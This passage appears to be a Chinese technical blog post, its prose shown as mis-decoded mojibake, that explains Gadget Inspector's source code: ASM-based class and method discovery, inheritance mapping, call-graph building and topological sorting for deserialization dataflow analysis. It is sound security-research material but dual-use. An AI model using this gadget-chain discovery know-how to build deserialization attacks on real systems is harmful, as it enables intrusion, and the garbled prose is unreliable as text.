<h4 id="ç±»ç»“æ„åˆ†æ"><a href="#ç±»ç»“æ„åˆ†æ" class="headerlink" title="ç±»ç»“æ„åˆ†æ"></a>ç±»ç»“æ„åˆ†æ</h4><p>Gadget Inspector é’ˆå¯¹é¡¹ç›®ä¸­çš„ç±»çš„ç»“æ„åˆ†æå¼€å§‹äº MethodDiscovery ç±»çš„ discover æ–¹æ³•ã€‚<br>classResourceEnumerator ç±»å­˜å‚¨äº†å½“å‰é¡¹ç›®ä¸­æ‰€æœ‰è¢«æŒ‡å®šçš„éœ€è¦åˆ†æçš„ç±»ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·æŒ‡å®šçš„jaråŒ…ã€JDKåŸç”Ÿçš„ä¾èµ–åº“ã€‚é€šè¿‡è·å–æ¯ä¸€ä¸ªç±»çš„å­—èŠ‚ç æµå°†å…¶ä¼ é€’ç»™<br>ASMæ¡†æ¶çš„ClassVisitorå¯¹æ¯ä¸€ä¸ªç±»è¿›è¡Œè§£æã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> classResource.getInputStream()) &#123;</span><br><span class="line">                <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(in);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    cr.accept(<span class="keyword">new</span> <span class="title class_">MethodDiscoveryClassVisitor</span>(), ClassReader.EXPAND_FRAMES);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    LOGGER.error(<span class="string">&quot;Exception analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>MethodDiscoveryClassVisitor ç±»æ˜¯ ASM æ¡†æ¶ ClassVisitor ç±»çš„å®ç°ç±»ï¼Œåœ¨å½“å‰æ­¥éª¤ä¸­ MethodDiscoveryClassVisitor ä¸»è¦é€šè¿‡å®ç° ClassVistor<br>çš„ visit visitField visitMethod visitEnd æ–¹æ³•ç±»å¯¹ç±»çš„å­—æ®µã€æ–¹æ³•è¿›è¡Œåˆ†æã€‚<br>ä¸Šè¿°å››ä¸ªæ–¹æ³•å°†æŒ‰ç…§é¡ºåºä¾æ¬¡è°ƒç”¨ï¼Œé¦–å…ˆæ˜¯visitæ–¹æ³•è¢«è°ƒç”¨ï¼Œç”¨äºè®¿é—®ç±»çš„åŸºæœ¬ä¿¡æ¯ï¼ˆå¦‚ç‰ˆæœ¬ã€è®¿é—®æ ‡å¿—ã€ç±»åã€çˆ¶ç±»åã€æ¥å£ç­‰ï¼‰ï¼Œå®ƒæ ‡å¿—ç€ç±»çš„å¼€å§‹ã€‚<br>éœ€è¦ç‰¹åˆ«è¯´æ˜çš„æ˜¯ ClassReference.Handle è¡¨ç¤ºæŸä¸€ä¸ªç±»çš„å¤„ç†å¥æŸ„ï¼ŒGadget Inspectorå°†ç±»åå°è£…åˆ°è¯¥ç±»ä¸­ç”¨ä»¥ä½œä¸ºåç»­æ­¥éª¤ä¸­ä»å„ç§æ•°æ®ç»“æ„ä¸­è®¿é—®ç±»ä¿¡æ¯çš„å¥æŸ„<br>ä¸ä»…ç±»åè¢«å°è£…é€šè¿‡å¥æŸ„è®¿é—®ï¼Œåç»­ç±»æ–¹æ³•ä»¥åŠç±»æˆå‘˜ä¿¡æ¯åŒæ ·è¢«å°è£…ä¸ºå¥æŸ„ã€‚ä¸ç±»ä¸åŒæ–¹æ³•å¥æŸ„å°†ä¸ç»åŒ…å«æ–¹æ³•åä¿¡æ¯ï¼Œè¿˜å°†åŒ…æ‹¬æ–¹æ³•ç­¾åã€è¿”å›å€¼ç­‰ä¿¡æ¯ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span> <span class="params">( <span class="type">int</span> version, <span class="type">int</span> access, String name, String signature, String superName, String[]interfaces)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.superName = superName;</span><br><span class="line">            <span class="built_in">this</span>.interfaces = interfaces;</span><br><span class="line">            <span class="built_in">this</span>.isInterface = (access &amp; Opcodes.ACC_INTERFACE) != <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">this</span>.members = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="built_in">this</span>.classHandle = <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(name);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>å½“ visit æ–¹æ³•è°ƒç”¨å®Œæ¯•åï¼ŒvisitFieldæ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œç”¨äºè®¿é—®ç±»ä¸­çš„æ¯ä¸ªå­—æ®µã€‚å¦‚æœå­˜åœ¨å¤šä¸ªå­—æ®µï¼ŒvisitFieldä¼šä¸ºæ¯ä¸ªå­—æ®µå•ç‹¬è°ƒç”¨ä¾æ¬¡ã€‚<br>è¯¥é‡è½½æ–¹æ³•ä¸­å¯¹å­—æ®µçš„è®¿é—®ä¿®é¥°ç¬¦è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœå½“å‰å­—æ®µçš„è®¿é—®ä¿®é¥°ç¬¦ä¸º ACC_STATIC å³è¢« static å…³é”®è¯ä¿®é¥°åˆ™æ­¥è®°å½•è¯¥å­—æ®µåˆ° members å˜é‡ä¸­ã€‚<br>è¿™æ˜¯å› ä¸ºé™æ€å­—æ®µåœ¨ç±»åŠ è½½æ—¶è¢«åˆå§‹åŒ–ä¸èƒ½è¢«æ”»å‡»è€…æ‰€æ§åˆ¶ä¿®æ”¹ï¼Œäºååºåˆ—åŒ–æ¼æ´æ— ç›Šã€‚é’ˆå¯¹å¼•ç”¨æ•°æ®ç±»å‹Objectä»¥åŠArrayï¼ŒGadget Inspectoråªè·å–å…¶å†…éƒ¨ç±»å‹<br>è€Œä¸å¿…è·å–å…¶å®Œæ•´çš„ç±»å‹æè¿°ç¬¦ï¼Œå¦‚ï¼šå˜é‡ String sï¼Œå…¶ç±»å‹æè¿°ç¬¦ä¸º Ljava&#x2F;lang&#x2F;String;ï¼Œè€Œå…¶å†…éƒ¨ç±»å‹ä¸º java&#x2F;lang&#x2F;Stringã€‚<br>ç±»æˆå‘˜ä¿¡æ¯æœ€ç»ˆè¢«å°è£…ä¸º ClassReference.Member ç±»å¹¶å­˜å‚¨åœ¨ members å˜é‡ä¸­ï¼Œè¯¥ç±»å°è£…äº†å­—æ®µåã€è®¿é—®ä¿®é¥°ç¬¦ä»¥åŠå­—æ®µç±»å‹ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc,</span></span><br><span class="line"><span class="params">                                       String signature, Object value)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> Type.getType(desc);</span><br><span class="line">                String typeName;</span><br><span class="line">                <span class="keyword">if</span> (type.getSort() == Type.OBJECT || type.getSort() == Type.ARRAY) &#123;</span><br><span class="line">                    typeName = type.getInternalName();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    typeName = type.getDescriptor();</span><br><span class="line">                &#125;</span><br><span class="line">                members.add(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Member(name, access, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(typeName)));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨æ‰€æœ‰å­—æ®µéƒ½è¢«è®¿é—®å®Œåï¼ŒvisitMethod æ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œç”¨äºè®¿é—®ç±»ä¸­çš„æ¯ä¸ªæ–¹æ³•ã€‚å¦‚æœæœ‰å¤šä¸ªæ–¹æ³•ï¼ŒvisitMethod ä¼šä¸ºæ¯ä¸ªæ–¹æ³•ä¾æ¬¡è°ƒç”¨ä¸€æ¬¡ã€‚<br>visitMethodæ–¹æ³•å°†å½“å‰ç±»ä¸­æ‰€æœ‰çš„æ–¹æ³•å°è£…ä¸º MethodReference ç±»ï¼Œå¹¶æœ€ç»ˆè¢«å­˜å‚¨åœ¨ discoveredMethods å˜é‡ä¸­ã€‚<br>éœ€è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯åœ¨è¿›è¡Œæ–¹æ³•ä¿¡æ¯å­˜å‚¨æ˜¯å­˜å‚¨äº†å½“å‰æ–¹æ³•æ˜¯å¦æ˜¯ç±»æ–¹æ³•ï¼Œè¯¥ä¿¡æ¯ä¸»è¦åœ¨åç»­è¿›è¡Œæ•°æ®æµä¼ æ’­åˆ†ææ—¶å¯¹é™æ€æ–¹æ³•è¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isStatic</span> <span class="operator">=</span> (access &amp; Opcodes.ACC_STATIC) != <span class="number">0</span>;</span><br><span class="line">            discoveredMethods.add(<span class="keyword">new</span> <span class="title class_">MethodReference</span>(</span><br><span class="line">                    classHandle,</span><br><span class="line">                    name,</span><br><span class="line">                    desc,</span><br><span class="line">                    isStatic));</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>å½“ç±»çš„æ‰€æœ‰å­—æ®µå’Œæ–¹æ³•éƒ½è¢«è®¿é—®å®Œæ¯•åï¼ŒvisitEnd æ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œè¡¨ç¤ºç±»è®¿é—®çš„ç»“æŸã€‚<br>è¯¥æ–¹æ³•å°†å·²ç»è®¿é—®çš„ç±»ä¿¡æ¯å°è£…ä¸ºClassReferenceå¯¹è±¡å­˜å‚¨åœ¨ discoveredClasses å˜é‡ä¸­ï¼Œç”¨äºæ ‡è¯†å·²ç»è¢«è®¿é—®è¿‡çš„ç±»ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">ClassReference</span> <span class="variable">classReference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReference</span>(</span><br><span class="line">                    name,</span><br><span class="line">                    superName,</span><br><span class="line">                    interfaces,</span><br><span class="line">                    isInterface,</span><br><span class="line">                    members.toArray(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Member[members.size()]));</span><br><span class="line">            discoveredClasses.add(classReference);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.visitEnd();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šè¿°å››ä¸ªæ–¹æ³•è°ƒç”¨å®Œæ¯•åï¼Œæˆ‘ä»¬ä¾¿å¯é€šè¿‡ MethodDiscovery å¯¹è±¡çš„ discoveredClasses ä»¥åŠ discoveredMethods å˜é‡è·å–åˆ°å½“å‰ç±»ä¸­æ‰€æœ‰å­—æ®µä»¥åŠæ–¹æ³•ä¿¡æ¯ã€‚<br>ä¸ºäº†æ–¹ä¾¿åç»­è¿‡ç¨‹ä½¿ç”¨è¿™ä¸€æ­¥ç”Ÿæˆçš„ä¿¡æ¯ï¼ŒGadget Inspector è°ƒç”¨ MethodDiscovery çš„ save æ–¹æ³•å°†è¿™äº›ä¿¡æ¯ä¿å­˜åˆ°æœ¬åœ°æ–‡ä»¶ä¸­åˆ†åˆ«ä¸º classes.dat ä»¥åŠ methods.dat<br>ç”¨ä»¥å­˜å‚¨ç±»ä¿¡æ¯ä»¥åŠæ–¹æ³•ä¿¡æ¯ã€‚<br>classes.datçš„æ•°æ®å­˜å‚¨ç»“æ„ä¸ºï¼š<br>å…¨ç±»å|çˆ¶ç±»å|æ¥å£åˆ—è¡¨|æ˜¯å¦æ˜¯æ¥å£|æˆå‘˜åˆ—è¡¨<br>methods.datçš„æ•°æ®å­˜å‚¨ç»“æ„ä¸ºï¼š<br>æ‰€å±ç±»å…¨ç±»å|æ–¹æ³•å|æ–¹æ³•æè¿°ç¬¦|æ˜¯å¦æ˜¯é™æ€æ–¹æ³•<br>ç±»åŸºæœ¬ä¿¡æ¯å­˜å‚¨å®Œæ¯•å Gadget Inspector å°†åˆ©ç”¨ discoveredClasses å˜é‡ä¸­å­˜å‚¨çš„ç±»ä¿¡æ¯è®¡ç®—ç±»çš„ç»§æ‰¿æ ‘å¹¶å°†å…¶å­˜å‚¨åˆ° inheritanceMap.dat æ–‡ä»¶ä¸­ã€‚<br>é¦–å…ˆä» ClassReference å¯¹è±¡ä¸­è·å–çˆ¶ç±»ä»¥åŠæ¥å£ä¿¡æ¯ï¼Œå†ä»classMapä¸­è·å–åˆ°å½“å‰ç±»çš„çˆ¶ç±»ä¸æ¥å£çš„ ClassReference å¯¹è±¡ï¼Œæœ€åè¿›è¡Œé€’å½’è°ƒç”¨ï¼Œè·å¾—åŸºç±»çš„æ‰€æœ‰<br>çˆ¶ç±»ä»¥åŠæ¥å£ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getAllParents</span><span class="params">(ClassReference classReference, Map&lt;ClassReference.Handle, ClassReference&gt; classMap, Set&lt;ClassReference.Handle&gt; allParents)</span> &#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (classReference.getSuperClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">        parents.add(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(classReference.getSuperClass()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (String iface : classReference.getInterfaces()) &#123;</span><br><span class="line">        parents.add(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(iface));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle immediateParent : parents) &#123;</span><br><span class="line">        <span class="type">ClassReference</span> <span class="variable">parentClassReference</span> <span class="operator">=</span> classMap.get(immediateParent);</span><br><span class="line">        <span class="keyword">if</span> (parentClassReference == <span class="literal">null</span>) &#123;</span><br><span class="line">        LOGGER.debug(<span class="string">&quot;No class id for &quot;</span> + immediateParent.getName());</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        allParents.add(parentClassReference.getHandle());</span><br><span class="line">        getAllParents(parentClassReference, classMap, allParents);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆ inheritanceMap.dat çš„æ•°æ®å­˜å‚¨ç»“æ„ä¸ºï¼š<br>å½“å‰ç±»å…¨ç±»å|çˆ¶ç±»ä»¥åŠæ¥å£åˆ—è¡¨  </p>
<h4 id="æ•°æ®æµåˆ†æ"><a href="#æ•°æ®æµåˆ†æ" class="headerlink" title="æ•°æ®æµåˆ†æ"></a>æ•°æ®æµåˆ†æ</h4><p>æ•°æ®æµåˆ†ææ˜¯ Gadget Inspector ä¸­æœ€æ ¸å¿ƒçš„æ¨¡å—ï¼Œå…¶ç›®çš„æ˜¯å¯¹æ•°æ®æµè¿›è¡Œä¼ æ’­åˆ†æï¼Œä»è€Œç¡®å®šæ–¹æ³•å…¥å‚ä¸è¿”å›å€¼çš„å…³ç³»ã€‚æ•°æ®æµåˆ†ææ•´ä½“ä¸Šåˆ†ä¸º3æ­¥ï¼Œå³æ„é€ æ–¹æ³•è°ƒç”¨å›¾ã€<br>å¯¹æ‰€æœ‰æ–¹æ³•è¿›è¡Œé€†æ‹“æ‰‘æ’åºã€è®¡ç®—æ•°æ®ä¼ æ’­æµå›¾ã€‚  </p>
<h5 id="åˆ†ææ–¹æ³•è°ƒç”¨å…³ç³»"><a href="#åˆ†ææ–¹æ³•è°ƒç”¨å…³ç³»" class="headerlink" title="åˆ†ææ–¹æ³•è°ƒç”¨å…³ç³»"></a>åˆ†ææ–¹æ³•è°ƒç”¨å…³ç³»</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, <span class="keyword">final</span> GIConfig config)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">        <span class="type">InheritanceMap</span> <span class="variable">inheritanceMap</span> <span class="operator">=</span> InheritanceMap.load();</span><br><span class="line"></span><br><span class="line">        Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName = discoverMethodCalls(classResourceEnumerator);</span><br><span class="line">        List&lt;MethodReference.Handle&gt; sortedMethods = topologicallySortMethodCalls();</span><br><span class="line">        passthroughDataflow = calculatePassthroughDataflow(classResourceByName, classMap, inheritanceMap, sortedMethods,</span><br><span class="line">                config.getSerializableDecider(methodMap, inheritanceMap));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>æ–¹æ³•è°ƒç”¨å›¾çš„æ„é€ åªæ˜¯ç®€å•å¾—ä½¿ç”¨ MethodCallDiscoveryClassVisitor è¿™ä¸ª ClassVisitor é€šè¿‡å¯¹å…¶é‡å†™çš„ visitMethod æ–¹æ³•è¿›è¡Œè°ƒç”¨æ—¶é€šè¿‡å¼•å…¥<br>MethodCallDiscoveryMethodVisitor è¿™ä¸ª  MehtodVisitorï¼Œé€šè¿‡å…¶ visitMethodInsn æ–¹æ³•çš„è°ƒç”¨ä»è€Œè®°å½•å½“å‰ç±»çš„æ¯ä¸€ä¸ªæ–¹æ³•åœ¨ç”¨è¿‡ç¨‹ä¸­å‘èµ·äº†å“ªäº›å…¶ä»–çš„æ–¹æ³•è°ƒç”¨ã€‚<br>visitMethodInsn æ–¹æ³•ç›‘å¬çš„æ–¹æ³•è°ƒç”¨ç±»å‹åŒ…æ‹¬ INVOKEVIRTUALã€INVOKESPECIALã€INVOKESTATICã€INVOKEINTERFACEï¼Œ<br>å³å®ä¾‹æ–¹æ³•è°ƒç”¨ã€ï¼ˆæ„é€ å‡½æ•°ï¼Œç§æœ‰æ–¹æ³•ï¼Œçˆ¶ç±»æ–¹æ³•ï¼‰ã€é™æ€æ–¹æ³•è°ƒç”¨ã€æ¥å£æ–¹æ³•è°ƒç”¨ã€‚   </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc, <span class="type">boolean</span> itf)</span> &#123;</span><br><span class="line">            calledMethods.add(<span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc));</span><br><span class="line">            <span class="built_in">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™äº›æ–¹æ³•è°ƒç”¨æœ€ç»ˆä¼šè¢«è®°å½•åˆ° methodCalls å˜é‡ä¸­å¹¶é€šè¿‡å¯¹åº”çš„æ–¹æ³•å¥æŸ„è¿›è¡Œç´¢å¼•ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">MethodCallDiscoveryMethodVisitor</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> api, <span class="keyword">final</span> MethodVisitor mv,</span></span><br><span class="line"><span class="params">                                           <span class="keyword">final</span> String owner, String name, String desc)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(api, mv);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.calledMethods = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            methodCalls.put(<span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc), calledMethods);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h5 id="æ‹“æ‰‘æ’åº"><a href="#æ‹“æ‰‘æ’åº" class="headerlink" title="æ‹“æ‰‘æ’åº"></a>æ‹“æ‰‘æ’åº</h5><p>åœ¨äº†è§£Gadget Inspector çš„é€†æ‹“æ‰‘æ’åºæ–¹æ³•ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä»¥ä¸‹ä»€ä¹ˆæ˜¯æ‹“æ‰‘æ’åºï¼Œå½“å‰æƒ…å¢ƒä¸‹ä¸ºä»€ä¹ˆéœ€è¦æ‹“æ‰‘æ’åºã€‚  </p>
<h6 id="å›¾ç›¸å…³æ¦‚å¿µ"><a href="#å›¾ç›¸å…³æ¦‚å¿µ" class="headerlink" title="å›¾ç›¸å…³æ¦‚å¿µ"></a>å›¾ç›¸å…³æ¦‚å¿µ</h6><p>å‡è®¾å­˜åœ¨ä¸€ä¸ªäºŒå…ƒç»„ G &#x3D; (V, E)ï¼Œå…¶ä¸­Væ˜¯ä¸€ç³»åˆ—ç‚¹çš„é›†åˆï¼ŒEæ˜¯ä¸€ç³»åˆ—è¾¹çš„é›†åˆï¼Œå…¶ä¸­V &#x3D; {v1, v2, v3, v4, v5}ï¼ŒE &#x3D; {(v1, v2), (v2, v3), (v3, v4), (v4, v5), (v5, v1)}ï¼Œé‚£ä¹ˆGå°±æ˜¯ä¸€ä¸ªå›¾ã€‚<br>æˆ‘ä»¬å°†Vä¸­çš„æŸä¸€ä¸ªç‚¹ç§°ä¸ºè¿™ä¸ªå›¾çš„é¡¶ç‚¹ï¼Œä¸è¯¥é¡¶ç‚¹ç›¸å…³è”çš„è¾¹çš„æ¡æ•°ç§°ä¸ºè¯¥é¡¶ç‚¹çš„åº¦ï¼Œä¾‹å¦‚ï¼šåœ¨å›¾Gä¸­ï¼Œä¸é¡¶ç‚¹ v1 ç›¸å…³çš„è¾¹ä¸º(v1, v2) å’Œ (v5, v1)ï¼Œæ•…å…¶åº¦ä¸º2ã€‚<br>åº¦åˆåˆ†ä¸ºå…¥åº¦ä¸å‡ºåº¦ï¼Œä¸€ä¸ªé¡¶ç‚¹çš„å…¥åº¦æŒ‡çš„æ˜¯ä»¥è¯¥é¡¶ç‚¹ä¸ºç»ˆç‚¹çš„è¾¹æ•°ï¼Œå‡ºåº¦æŒ‡çš„æ˜¯ä»¥è¯¥é¡¶ç‚¹ä¸ºèµ·ç‚¹çš„è¾¹æ•°ï¼Œæ•…é¡¶ç‚¹ V1 çš„å…¥åº¦ä¸å‡ºåº¦å‡ä¸º1ã€‚<br>åœ¨å›¾Gä¸­ï¼Œæ¯ä¸€æ¡è¾¹å‡æ˜¯æœ‰æ–¹å‘çš„ï¼Œè¢«è®°ä½œ(u, v)ï¼Œæ•…ç§°å›¾Gæ˜¯ä¸€ä¸ªæœ‰å‘å›¾ã€‚åœ¨ä¸€ä¸ªå›¾ä¸­ä¸€ç³»åˆ—ç›¸äº’è¿æ¥çš„è¾¹è¢«ç§°ä¸ºä¸€æ¡é€”å¾„ï¼Œè‹¥è¾¹ä¸¤ä¸¤ä¸åŒåˆ™è¢«ç§°ä¸ºä¸€æ¡è¿¹ï¼Œè‹¥ç‚¹ä¹Ÿä¸¤ä¸¤ä¸åŒï¼Œåˆ™è¢«ç§°ä¸ºä¸€æ¡è·¯å¾„ã€‚<br>å¯¹äºä¸€æ¡è¿¹ï¼Œå¦‚æœå…¶èµ·ç‚¹ä¸ç»ˆç‚¹ä¸€è‡´ï¼Œé‚£ä¹ˆè¯¥è¿¹ç§°ä¸ºä¸€æ¡å›è·¯ã€‚å¯¹äºä¸€æ¡å›è·¯ï¼Œå¦‚æœå…¶èµ·ç‚¹ä¸ç»ˆç‚¹æ˜¯å”¯ä¸€ç›¸åŒçš„ç‚¹ï¼Œåˆ™ç§°è¯¥å›è·¯æ˜¯ä¸€ä¸ªç¯ã€‚<br>æ‰€è°“æœ‰å‘æ— ç¯å›¾åˆ™å¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼Œå…¶ä¸€è¯¥å›¾æ˜¯ä¸€ä¸ªæœ‰å‘å›¾ï¼›å…¶äºŒè¯¥å›¾ä¸å­˜åœ¨ç¯ã€‚<br>æœ‰å‘æ— ç¯å›¾å­˜åœ¨ä¸¤ä¸ªæ€§è´¨ï¼Œå…¶ä¸€èƒ½è¿›è¡Œæ‹“æ‰‘æ’åºçš„å›¾ï¼Œä¸€å®šæ˜¯æœ‰å‘æ— ç¯å›¾ï¼›å…¶äºŒæœ‰å‘æ— ç¯å›¾ä¸€å®šèƒ½è¿›è¡Œæ‹“æ‰‘æ’åºã€‚  </p>
<h6 id="ä¸ºä»€ä¹ˆéœ€è¦å°†æ‰€æœ‰æ–¹æ³•è¿›è¡Œæ‹“æ‰‘æ’åº"><a href="#ä¸ºä»€ä¹ˆéœ€è¦å°†æ‰€æœ‰æ–¹æ³•è¿›è¡Œæ‹“æ‰‘æ’åº" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦å°†æ‰€æœ‰æ–¹æ³•è¿›è¡Œæ‹“æ‰‘æ’åº"></a>ä¸ºä»€ä¹ˆéœ€è¦å°†æ‰€æœ‰æ–¹æ³•è¿›è¡Œæ‹“æ‰‘æ’åº</h6><p>æ‹“æ‰‘æ’åºçš„ç›®æ ‡æ˜¯å°†æ‰€æœ‰èŠ‚ç‚¹æ’åºï¼Œä½¿å¾—æ’åœ¨å‰é¢çš„èŠ‚ç‚¹ä¸èƒ½ä¾èµ–äºæ’åœ¨åé¢çš„èŠ‚ç‚¹ã€‚<br>åœ¨æœ¬é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ±‚è§£çš„æ˜¯æ–¹æ³•çš„å‚æ•°ä¸è¿”å›å€¼çš„å…³ç³»ï¼Œè€Œä¸€ä¸ªæ–¹æ³•è°ƒç”¨ä¸­å¯èƒ½å­˜åœ¨å¦å¤–ä¸€ä¸ªæ–¹æ³•è°ƒç”¨ï¼Œè¯¥æ–¹æ³•å¯èƒ½ä¼šæ¥å—å¤–å±‚æ–¹æ³•çš„å‚æ•°åŒæ—¶å…¶è¿”å›å€¼å¯èƒ½ä¼šå½±å“å¤–å±‚æ–¹æ³•çš„å±€éƒ¨å˜é‡ï¼Œ<br>è€Œè¯¥å±€éƒ¨å˜é‡åˆå¯èƒ½ä¼šå½±å“å¤–å±‚æ–¹æ³•çš„è¿”å›å€¼ï¼Œ æ•…æˆ‘ä»¬åœ¨å¯¹å¤–å±‚æ–¹æ³•çš„å…¥å‚ä¸è¿”å›å€¼çš„å…³ç³»è¿›è¡Œæ±‚è§£æ—¶éœ€è¦å…ˆå¯¹å†…å±‚è¢«è°ƒç”¨æ–¹æ³•çš„å…¥å‚ä¸è¿”å›å€¼çš„å…³ç³»è¿›è¡Œæ±‚è§£ã€‚<br>åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¦‚æœéœ€è¦åˆ¤æ–­æ–¹æ³•açš„å‚æ•°argä¼šä¸ä¼šæ±¡æŸ“å…¶è¿”å›å€¼ã€‚å› ä¸ºè¿”å›å€¼bræ¥è‡ªäºæ–¹æ³•bçš„æ‰§è¡Œç»“æœï¼Œæ•…æˆ‘ä»¬éœ€è¦å…ˆåˆ¤æ–­æ–¹æ³•bçš„å…¥å‚arg2ä¼šä¸ä¼šæ±¡æŸ“å…¶è¿”å›å€¼ã€‚<br>åœ¨æ–¹æ³•bä¸­å› ä¸ºå½¢å‚arg2ä¼šæ±¡æŸ“æ–¹æ³•bçš„è¿”å›å€¼ï¼Œæ•…åœ¨æ–¹æ³•aä¸­arg1ä½œä¸ºæ–¹æ³•bçš„å®å‚è¢«ä¼ 